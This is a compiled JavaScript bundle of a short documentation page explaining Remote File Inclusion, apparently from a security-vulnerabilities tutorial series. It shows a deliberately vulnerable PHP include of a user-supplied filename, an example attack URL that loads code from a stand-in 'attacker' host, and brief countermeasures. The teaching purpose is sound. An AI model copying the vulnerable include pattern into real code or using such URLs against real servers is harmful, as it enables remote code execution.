"use strict";
(self.webpackChunkdocs = self.webpackChunkdocs || []).push([
  [1595],
  {
    3962: (e, i, t) => {
      t.r(i),
        t.d(i, {
          assets: () => c,
          contentTitle: () => u,
          default: () => m,
          frontMatter: () => a,
          metadata: () => o,
          toc: () => p,
        });
      var l = t(7462),
        r = t(3366),
        n = (t(7294), t(3905)),
        s = (t(828), ["components"]),
        a = {},
        u = "RFI",
        o = {
          unversionedId: "security/vulnerabilities/rfi",
          id: "security/vulnerabilities/rfi",
          title: "RFI",
          description:
            "Remote File Inclusion (RFI) is a vulnerability where a server includes",
          source: "@site/docs/security/vulnerabilities/rfi.md",
          sourceDirName: "security/vulnerabilities",
          slug: "/security/vulnerabilities/rfi",
          permalink: "/docs/security/vulnerabilities/rfi",
          draft: !1,
          tags: [],
          version: "current",
          frontMatter: {},
          sidebar: "tutorialSidebar",
          previous: {
            title: "Man In The Middle",
            permalink: "/docs/security/vulnerabilities/mitm",
          },
          next: {
            title: "SQL Injection",
            permalink: "/docs/security/vulnerabilities/sqli",
          },
        },
        c = {},
        p = [
          { value: "Example", id: "example", level: 2 },
          { value: "Countermeasures", id: "countermeasures", level: 2 },
        ],
        d = { toc: p };
      function m(e) {
        var i = e.components,
          t = (0, r.Z)(e, s);
        return (0, n.kt)(
          "wrapper",
          (0, l.Z)({}, d, t, { components: i, mdxType: "MDXLayout" }),
          (0, n.kt)("h1", { id: "rfi" }, "RFI"),
          (0, n.kt)(
            "p",
            null,
            (0, n.kt)("strong", { parentName: "p" }, "Remote File Inclusion"),
            " (",
            (0, n.kt)("strong", { parentName: "p" }, "RFI"),
            ") is a vulnerability where a server includes\nremote files specified by the user."
          ),
          (0, n.kt)("h2", { id: "example" }, "Example"),
          (0, n.kt)("p", null, "Consider the following PHP statements"),
          (0, n.kt)(
            "pre",
            null,
            (0, n.kt)(
              "code",
              { parentName: "pre", className: "language-php" },
              '$incfile = $_REQUEST["file"];\ninclude($incfile.".php");\n'
            )
          ),
          (0, n.kt)(
            "p",
            null,
            "This would be vulnerable to\n",
            (0, n.kt)(
              "inlineCode",
              { parentName: "p" },
              "http://localhost/page.php?file=http://attacker/malicious_page"
            ),
            "."
          ),
          (0, n.kt)("h2", { id: "countermeasures" }, "Countermeasures"),
          (0, n.kt)(
            "p",
            null,
            "Disallow including remote files if not needed. Otherwise, use a whitelist of\naccepted URLs"
          )
        );
      }
      m.isMDXComponent = !0;
    },
  },
]);
